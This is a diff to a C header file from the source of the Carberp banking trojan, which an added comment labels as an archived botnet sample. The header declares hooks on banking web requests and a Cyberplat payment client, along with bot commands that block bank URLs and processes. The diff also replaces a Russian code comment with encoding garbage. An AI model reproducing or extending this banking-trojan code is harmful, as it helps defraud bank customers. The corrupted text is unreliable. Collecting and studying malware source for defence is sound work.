@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #ifndef RuBnkH
 #define RuBnkH
@@ -10,7 +21,7 @@ void IsBank( HINTERNET hRequest);
 bool IbankHooksMain();
 bool HookCyberplatPCMain();
 const char Iblock_Url[] = "iblock\0";
-const char Iblock_processblock[] = "processblock\0";///блокировка процесса качаем файл и при запуске выдаем мессагу с ним 
+const char Iblock_processblock[] = "processblock\0";///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ 
 bool ExecuteIblock_Url(LPVOID Manager, PCHAR Command, PCHAR Args);
 bool ExecuteIblock_processblock(LPVOID Manager, PCHAR Command, PCHAR Args);
 DWORD WINAPI IBlockThread(LPVOID lpData);
